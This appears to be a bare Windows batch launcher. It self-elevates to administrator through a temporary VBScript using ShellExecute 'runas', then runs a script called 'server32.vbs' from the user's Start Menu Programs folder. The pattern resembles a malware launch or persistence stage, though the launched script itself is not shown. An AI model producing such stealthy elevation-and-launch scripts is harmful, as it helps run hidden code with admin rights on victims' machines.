echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
set params = %*:"=""
echo UAC.ShellExecute "cmd.exe", "/c %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs" 
"%temp%\getadmin.vbs" 
del "%temp%\getadmin.vbs"
cd "%appdata%\Microsoft\Windows\Start Menu\Programs\"
wscript server32.vbs
